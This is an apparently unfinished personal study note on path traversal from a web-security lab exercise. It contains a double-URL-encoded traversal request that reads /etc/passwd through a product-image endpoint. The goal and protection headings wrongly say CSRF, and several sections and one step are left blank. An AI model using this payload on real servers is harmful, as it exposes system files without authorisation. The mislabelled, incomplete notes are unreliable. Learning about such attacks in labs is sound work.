## Path Traversals
**Date completed**: 2025-05-08


### Goal

Understand the basics of CSRF

### Key concepts
- A
#### Quick Notes


### Example to Remember

1. Browse to **Product image** endpoint and intercept the request  
   `GET /image?filename=45.jpg`
2. Replace the `filename` value with  
3. Forward the request and observe the server returning the contents of `/etc/passwd`.

```http
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/2
```


### Ways to Protect Against CSRF

🧠 What I Learned
  - 
  